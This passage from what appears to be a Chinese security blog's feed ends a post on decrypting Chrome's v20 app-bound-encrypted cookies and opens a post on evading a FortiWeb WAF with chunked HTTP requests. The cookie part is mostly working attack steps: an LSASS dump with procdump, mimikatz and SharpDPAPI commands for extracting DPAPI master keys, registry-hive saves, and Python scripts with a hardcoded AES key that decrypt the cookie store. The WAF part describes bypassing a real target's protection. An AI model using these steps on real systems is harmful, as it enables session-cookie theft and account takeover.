href="https://github.com/runassu/chrome_v20_decryption/issues/7#issuecomment-2440225877">https://github.com/runassu/chrome_v20_decryption/issues/7#issuecomment-2440225877</a></p></li><li><p>版本二：无需创建服务使用Windows API。<br><a href="https://github.com/runassu/chrome_v20_decryption/issues/7#issuecomment-2444721010">https://github.com/runassu/chrome_v20_decryption/issues/7#issuecomment-2444721010</a></p></li></ul><h2 id="离线解密（手动）"><a href="#离线解密（手动）" class="headerlink" title="离线解密（手动）"></a>离线解密（手动）</h2><p><strong>将需要在本地执行的脚本<code>chrome_v20_decryption</code>拆分后离线完成。</strong></p><h3 id="获取App-Bound-Encrypted-key"><a href="#获取App-Bound-Encrypted-key" class="headerlink" title="获取App_Bound_Encrypted_key"></a>获取App_Bound_Encrypted_key</h3><p>离线<code>C:\Users\用户\AppData\Local\Google\Chrome\User Data\Local State</code>文件，然后取出<code>app_bound_encrypted_key</code>字段值进行处理</p><p><img src="/img/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/8.png"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;local state&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    local_state = json.load(f)</span><br><span class="line"></span><br><span class="line">app_bound_encrypted_key = local_state[<span class="string">&quot;os_crypt&quot;</span>][<span class="string">&quot;app_bound_encrypted_key&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(binascii.a2b_base64(app_bound_encrypted_key)[:<span class="number">4</span>] == <span class="string">b&quot;APPB&quot;</span>)</span><br><span class="line"></span><br><span class="line">app_bound_encrypted_key_b64 = binascii.b2a_base64(binascii.a2b_base64(app_bound_encrypted_key)[<span class="number">4</span>:]).decode().strip()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binascii.a2b_base64(app_bound_encrypted_key)[<span class="number">4</span>:].<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">byte_data = <span class="built_in">bytes</span>.fromhex(binascii.a2b_base64(app_bound_encrypted_key)[<span class="number">4</span>:].<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app_bound_encrypted_key_file&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> w:</span><br><span class="line">    w.write(byte_data)</span><br></pre></td></tr></table></figure><h3 id="分别获取系统和用户的MasterKey"><a href="#分别获取系统和用户的MasterKey" class="headerlink" title="分别获取系统和用户的MasterKey"></a>分别获取系统和用户的MasterKey</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>使用procdump dump出LSASS进程内存</p><p>管理员权限：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>使用mimikatz加载dmp文件并获取各个Master Key file对应的MasterKey</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure><p><img src="/img/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/9.png"></p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>复制注册表文件</p><p><strong>获取系统MasterKey</strong></p><p>管理员权限：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM.hiv</span><br><span class="line">reg save HKLM\SECURITY SECURITY.hiv</span><br></pre></td></tr></table></figure><p>从注册表文件中获得DPAPI_SYSTEM</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::secrets /system:SYSTEM.hiv /security:SECURITY.hiv</span><br></pre></td></tr></table></figure><p><img src="/img/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/10.png"></p><p><code>DPAPI_SYSTEM</code>中的<code>user hash</code>为<code>088f74cf89f8ac2f57ef14ef4c96d70fd9bba6ab</code>，能够用来解密位于<code>System32\Microsoft\Protect\S-1-5-18\User</code>下的系统<code>Master Key file</code></p><p>用以下脚本从<code>app_bound_encrypted_key</code>中获取使用解密的<code>guid</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_guid_master_key_from_file</span>(<span class="params">file_path, blob_type=<span class="string">&quot;credential&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从文件中读取 DPAPI blob 数据并提取 guidMasterKey。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param file_path: 文件路径</span></span><br><span class="line"><span class="string">    :param blob_type: blob 类型 (&quot;credential&quot;, &quot;policy&quot;, &quot;blob&quot;, &quot;rdg&quot;, &quot;chrome&quot;, &quot;keepass&quot;)</span></span><br><span class="line"><span class="string">    :return: 返回解析的 guidMasterKey 字符串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            blob_bytes = file.read()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 根据 blob 类型设置偏移量</span></span><br><span class="line">        <span class="keyword">if</span> blob_type == <span class="string">&quot;credential&quot;</span>:</span><br><span class="line">            offset = <span class="number">36</span></span><br><span class="line">        <span class="keyword">elif</span> blob_type <span class="keyword">in</span> [<span class="string">&quot;policy&quot;</span>, <span class="string">&quot;blob&quot;</span>, <span class="string">&quot;rdg&quot;</span>, <span class="string">&quot;chrome&quot;</span>, <span class="string">&quot;keepass&quot;</span>]:</span><br><span class="line">            offset = <span class="number">24</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unsupported blob type: <span class="subst">&#123;blob_type&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 确保字节数组长度足够</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(blob_bytes) &lt; offset + <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Blob data is too short to extract guidMasterKey.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取 guidMasterKey 的字节并格式化为 GUID</span></span><br><span class="line">        guid_master_key_bytes = blob_bytes[offset:offset + <span class="number">16</span>]</span><br><span class="line">        guid_master_key = <span class="built_in">str</span>(uuid.UUID(bytes_le=guid_master_key_bytes))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印 guidMasterKey</span></span><br><span class="line">        <span class="keyword">if</span> blob_type <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;rdg&quot;</span>, <span class="string">&quot;chrome&quot;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    guidMasterKey    : &#123;&#123;<span class="subst">&#123;guid_master_key&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> guid_master_key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;File &#x27;<span class="subst">&#123;file_path&#125;</span>&#x27; not found.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    file_path = <span class="string">&quot;app_bound_encrypted_key&quot;</span>  <span class="comment"># 替换为实际文件路径</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取并打印 guidMasterKey</span></span><br><span class="line">    guid = extract_guid_master_key_from_file(file_path, blob_type=<span class="string">&quot;chrome&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> guid:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Extracted guidMasterKey: &#123;&#123;<span class="subst">&#123;guid&#125;</span>&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>将<code>System32\Microsoft\Protect\S-1-5-18\User</code>下对应的<code>guid</code>文件复制出来解密</p><p><img src="/img/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/11.png"></p><p>得到系统的MasterKey<code>&#123;2eb60c3e-9d80-4988-a09d-3dfc004da831&#125;:832767e4d883fe95d4ec8d4cbe25adb79e35c6f7</code>，保存为masterkey_system.txt</p><p><strong>获取用户MasterKey</strong></p><p>将<code>C:\Users\用户名\AppData\Roaming\Microsoft\Protect\用户名对应的SID</code>整个文件夹离线出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpDPAPI.exe masterkeys /password:用户明文密码 /target:C:\Temp\SID文件夹</span><br></pre></td></tr></table></figure><p><img src="/img/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/12.png"></p><p>将得到的用户的MasterKey保存为masterkey_user.txt</p><h3 id="解密app-bound-encrypted-key和cookie"><a href="#解密app-bound-encrypted-key和cookie" class="headerlink" title="解密app_bound_encrypted_key和cookie"></a>解密app_bound_encrypted_key和cookie</h3><p>用system的masterkey对app_bound_encrypted_key密文进行第一次解密，<code>SYSTEM DPAPI</code><br>将得到的<code>dec(blob)</code>再次以hex形式写入文件中为app_bound_encrypted_key_file_2</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpDPAPI.exe blob /mkfile:./masterkey_system.txt /target:./app_bound_encrypted_key_file</span><br></pre></td></tr></table></figure><p><img src="/img/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/13.png"></p><p>用user的masterkey对app_bound_encrypted_key_file_2中的密文进行第二次解密，<code>user DPAPI</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpDPAPI.exe blob /mkfile:./masterkey_user.txt /target:./app_bound_encrypted_key_file_2</span><br></pre></td></tr></table></figure><p><img src="/img/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/14.png"></p><p>得到的<code>dec(blob)</code>为最终解密出来的key</p><p>在其他浏览器中，可以直接获取32字节AES密钥来解密加密的cookie，但从之前的代码分析得出的结论来看，Chrome还需要多一步（AES解密）。经过两步DPAPI解密后，结果值带有Chrome路径，然后是1字节标志0x01，12字节IV，32字节密文，16字节TAG。</p><p><img src="/img/ChromeCookies%E4%B9%8Bv20%E8%A7%A3%E5%AF%86/15.png"></p><p><strong>VI</strong>: <code>BD 6D 2D C8 D9 B9 E0 7D 80 4D DC C8</code><br><strong>ciphertext</strong>: <code>C9 3F D2 5A D0 EF F7 F3 E7 6F 91 AF F2 DF 88 C3 D3 EE 53 A9 E2 79 10 A4 BE 33 D3 E2 FC 30 D5 99</code><br><strong>TAG</strong>: <code>2E CF 8C 99 D8 BC 7B 6F CD 1E F9 B8 F5 4B 5E 97</code></p><p>使用<code>AES-256-GCM</code>对其进行解密，对应的解密密钥在之前已经给出，解密后将产生解密cookie的密钥，其接下来解密的工作原理与<code>v10</code>完全相同。</p><p>解密脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">brower, decrypted_key, db_path, output</span>):</span><br><span class="line">    decrypted_key = binascii.unhexlify(decrypted_key)</span><br><span class="line">    <span class="keyword">if</span> brower == <span class="string">&quot;chrome&quot;</span>:</span><br><span class="line">        decrypted_key = decrypted_key[-<span class="number">73</span>:-<span class="number">12</span>]</span><br><span class="line">        <span class="keyword">assert</span> (decrypted_key[<span class="number">0</span>] == <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># elevation_service.exe中的硬编码密钥，这里以base64形式载入</span></span><br><span class="line">        aes_key = binascii.a2b_base64(<span class="string">&quot;sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=&quot;</span>)</span><br><span class="line">        iv = decrypted_key[<span class="number">1</span>:<span class="number">1</span> + <span class="number">12</span>]</span><br><span class="line">        ciphertext = decrypted_key[<span class="number">1</span> + <span class="number">12</span>:<span class="number">1</span> + <span class="number">12</span> + <span class="number">32</span>]</span><br><span class="line">        tag = decrypted_key[<span class="number">1</span> + <span class="number">12</span> + <span class="number">32</span>:]</span><br><span class="line">        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)</span><br><span class="line">        key = cipher.decrypt_and_verify(ciphertext, tag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key = decrypted_key[-<span class="number">40</span>:-<span class="number">8</span>]</span><br><span class="line">    con = sqlite3.connect(pathlib.Path(db_path).as_uri() + <span class="string">&quot;?mode=ro&quot;</span>, uri=<span class="literal">True</span>)</span><br><span class="line">    cur = con.cursor()</span><br><span class="line">    r = cur.execute(<span class="string">&quot;SELECT host_key, path, name, CAST(encrypted_value AS BLOB), is_secure, is_httponly, samesite, creation_utc, expires_utc,last_access_utc from cookies;&quot;</span>)</span><br><span class="line">    cookies = cur.fetchall()</span><br><span class="line">    cookies_v20 = [c <span class="keyword">for</span> c <span class="keyword">in</span> cookies <span class="keyword">if</span> c[<span class="number">3</span>][:<span class="number">3</span>] == <span class="string">b&quot;v20&quot;</span>]</span><br><span class="line">    con.close()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output, <span class="string">&quot;a&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> a:</span><br><span class="line">        a.write(<span class="string">&quot;host_key\tpath\tname\tvalue\tis_secure\tis_httponly\tsamesite\tcreation_utc\texpires_utc\tlast_access_utc\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> cookies_v20:</span><br><span class="line">            a.write(<span class="string">&quot;\t&quot;</span>.join(c[:<span class="number">3</span>]) + <span class="string">&quot;\t&quot;</span> + decrypt_cookie_v20(key, c[<span class="number">3</span>]) +<span class="string">&quot;\t&quot;</span> + <span class="string">&quot;\t&quot;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> c[<span class="number">4</span>:]]) +<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_17bit_to_unix_timestamp</span>(<span class="params">seventeen_bit_timestamp</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fourteen_bit_timestamp = seventeen_bit_timestamp // <span class="number">1000</span></span><br><span class="line">        EPOCH_DIFFERENCE = <span class="number">11644473600</span></span><br><span class="line">        unix_timestamp = fourteen_bit_timestamp / <span class="number">1000</span> - EPOCH_DIFFERENCE</span><br><span class="line">        <span class="keyword">return</span> datetime.datetime.utcfromtimestamp(unix_timestamp)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> seventeen_bit_timestamp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_cookie_v20</span>(<span class="params">key, encrypted_value</span>):</span><br><span class="line">    cookie_iv = encrypted_value[<span class="number">3</span>:<span class="number">3</span> + <span class="number">12</span>]</span><br><span class="line">    encrypted_cookie = encrypted_value[<span class="number">3</span> + <span class="number">12</span>:-<span class="number">16</span>]</span><br><span class="line">    cookie_tag = encrypted_value[-<span class="number">16</span>:]</span><br><span class="line">    cookie_cipher = AES.new(key, AES.MODE_GCM, nonce=cookie_iv)</span><br><span class="line">    decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie,cookie_tag)</span><br><span class="line">    <span class="keyword">return</span> decrypted_cookie[<span class="number">32</span>:].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    BROWSER = <span class="string">&quot;chrome&quot;</span> <span class="comment"># chrome or edge</span></span><br><span class="line">    <span class="comment"># app_bound_encrypted_key经过两次DPAPI解密之后的密钥</span></span><br><span class="line">    key = <span class="string">&quot;1F00000002433A5C50726F6772616D2046696C65735C476F6F676C655C4368726F6D653D00000001BD6D2DC8D9B9E07D804DDCC8C93FD25AD0EFF7F3E76F91AFF2DF88C3D3EE53A9E27910A4BE33D3E2FC30D5992ECF8C99D8BC7B6FCD1EF9B8F54B5E970C0C0C0C0C0C0C0C0C0C0C0C&quot;</span></span><br><span class="line">    db_path = <span class="string">&quot;Cookies&quot;</span></span><br><span class="line">    output = <span class="string">&quot;Cookies.txt&quot;</span></span><br><span class="line">    decrypt(BROWSER, key, db_path, output)</span><br></pre></td></tr></table></figure><hr><p>参考资料：<br><a href="https://github.com/runassu/chrome_v20_decryption/issues/7#issuecomment-2445724559">https://github.com/runassu/chrome_v20_decryption/issues/7#issuecomment-2445724559</a><br><a href="https://www.elastic.co/security-labs/katz-and-mouse-game">Katz and Mouse Game: MaaS Infostealers Adapt to Patched Chrome Defenses</a><br><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey">渗透技巧-获取Windows系统下DPAPI中的MasterKey</a><br><a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials">https://github.com/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近Google对Windows版Chrome中存储的Cookie的保护机制做了升级，即&lt;code&gt;应用程序绑定加密&lt;/code&gt;。在Chr</summary>
      
    
    
    
    <category term="Decryption" scheme="https://0or1zo.github.io/categories/Decryption/"/>
    
    
    <category term="Chrome" scheme="https://0or1zo.github.io/tags/Chrome/"/>
    
    <category term="Cookies" scheme="https://0or1zo.github.io/tags/Cookies/"/>
    
  </entry>
  
  <entry>
    <title>利用HTTP协议分块传输绕过WAF</title>
    <link href="https://0or1zo.github.io/2024/10/22/%E5%88%A9%E7%94%A8HTTP%E5%8D%8F%E8%AE%AE%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87WAF/"/>
    <id>https://0or1zo.github.io/2024/10/22/%E5%88%A9%E7%94%A8HTTP%E5%8D%8F%E8%AE%AE%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87WAF/</id>
    <published>2024-10-22T12:01:49.000Z</published>
    <updated>2024-10-26T11:09:28.447Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在实战中遇到太多Fortieth的WAF——FortiWeb。做啥都被拦，这能忍？摇人！和一个大佬沟通了下，他说用<code>分块传输</code>可以绕过，好的，关键词已获取，然后就去查询了相关的资料，直接实战操作，可行！</p><h1 id="分块传输编码原理"><a href="#分块传输编码原理" class="headerlink" title="分块传输编码原理"></a>分块传输编码原理</h1><p><strong>分块传输编码</strong>（<code>Chunked transfer encoding</code>）是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器发送给客户端应用（ 通常是网页浏览器）的数据可以分成多个部分。分块传输编码只在HTTP协议1.1版本（HTTP&#x2F;1.1）中提供。</p><p>通常情况下，HTTP的响应消息体（message body）是作为整包发送到客户端的，用头（Content-Length）来表示消息体的长度，这个长度对客户端非常重要，因为对于持久连接TCP并不会在请求完立马结束，而是可以发送多次请求&#x2F;响应，客户端需要知道哪个位置才是响应消息的结束，以及后续响应的开始，因此Content-Length显得尤为重要，服务端必须精确地告诉客户端（message body）的长度是多少，如果（Content-Length）比实际返回的长度短，那么就会造成内容截断，如果比实体内容长，客户端就一直处于pendding状态，直到所有的（message body）都返回了请求才结束。</p><p>Web2.0的出现使得网页变得丰富多彩，内容也比早期的网页复杂很多，这样就会遇到一个问题，对于一个复杂的页面来说，如果是等到消息体完全创建好之后再计算出Content-Length返回给客户端的话，在客户端那边会有一个漫长的等待过程，而对于用户来说，一个页面的所能容忍的等待时间不超过3秒，因此如何让响应内容尽可能早的让用户看到是HTTP协议要考虑的问题。</p><p><strong>分块传输编码</strong>（<code>Transfer-Encoding</code>）就是这样一种解决方案：它把数据分解成一系列数据块，并以多个块发送给客户端，服务器发送数据时不再需要预先告诉客户端发送内容的总大小，只需在响应头里面添加<code>Transfer-Encoding: chunked</code>，以此来告诉浏览器我使用的是分块传输编码，这样就不需要Content-Length了，这就是分块传输编码<code>Transfer-Encoding</code>的作用。</p><p>HTTP 1.1引入分块传输编码带来的好处可参阅：<a href="https://zh.wikipedia.org/wiki/%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BC%96%E7%A0%81">维基百科</a></p><div class="note info flat"><p>在消息头中指定<code>Transfer-Encoding: chunked</code>就表示整个response将使用分块传输编码来传输内容，一个完整的消息体由n个块组成，并以最后一个大小为0的块为结束。每个非空的块包括两部分，分别为：块的长度（用十六进制表示）后面跟一个CRLF（\r\n），长度并不包括结尾的回车换行符。第二部分就是数据本身，同样以CRLF结束。最后一个分块长度值必须为0以及CRLF组成，对应的分块不包含任何数据，但必须有两个空行。</p></div><p>举例一个最简单的例子，向服务端POST一个内容为<code>id=123456</code>的数据包:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ID: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$id</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No ID received!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E5%88%A9%E7%94%A8HTTP%E5%8D%8F%E8%AE%AE%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87WAF/1.png"></p><p>可以尝试一下，如果关闭burp在repeater选项里面自带的content-length补全功能，然后去掉Content-Length，就无法接收到id的值。</p><p><img src="/img/%E5%88%A9%E7%94%A8HTTP%E5%8D%8F%E8%AE%AE%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87WAF/2.png"></p><p>接下来我们将其改为分块传输的方式：</p><p><img src="/img/%E5%88%A9%E7%94%A8HTTP%E5%8D%8F%E8%AE%AE%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87WAF/3.png"></p><p>通过上图可以看到，即使没有Content-Length，也可以采用分块传输的方式，分多少块，每块长度都不唯一，但<code>最后的结尾需要一个长度为0内容为空的块(内容为两个空行)</code>。</p><h1 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h1><p>分块传输限制也非常的明显，只在HTTP协议1.1版本（HTTP&#x2F;1.1）中提供，且只能在POST方法中使用。但是存在一些Web应用框架存在不支持POST请求的情况，像Laravel有着严格的路由限制,可以通过 Route::get()和Route::post()来定义允许的请求类型。若请求方法不匹配所定义的路由，Laravel会返回405 “Method Not Allowed”错误。例如，若一个只允许GET请求的路由存在SQL注入，对该路由发送POST请求则会被拒绝，这样子就无法使用分块传输进行绕过。</p><h1 id="利用分块传输绕过WAF：实战（已脱敏）"><a href="#利用分块传输绕过WAF：实战（已脱敏）" class="headerlink" title="利用分块传输绕过WAF：实战（已脱敏）"></a>利用分块传输绕过WAF：实战（已脱敏）</h1><p>已经确定目标存在.git泄露，正常访问&#x2F;.git&#x2F;网页403</p><p><img src="/img/%E5%88%A9%E7%94%A8HTTP%E5%8D%8F%E8%AE%AE%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87WAF/4.png"></p><p>访问&#x2F;.git&#x2F;index触发FortiWeb拦截页面，<code>Attack ID: 20000008</code>。</p><div class="note info flat"><p>在FortiWeb日志中，攻击ID 20000008通常表示系统检测到基于已知特征规则的潜在恶意行为。此攻击ID记录的情况包括参数、URL或数据包中的元素匹配已知的攻击模式。具体来说，可能涉及的攻击类型有跨站脚本（XSS）、SQL注入、通用攻击、信息泄露，甚至可能检测到恶意机器人等活动。</p></div><p><img 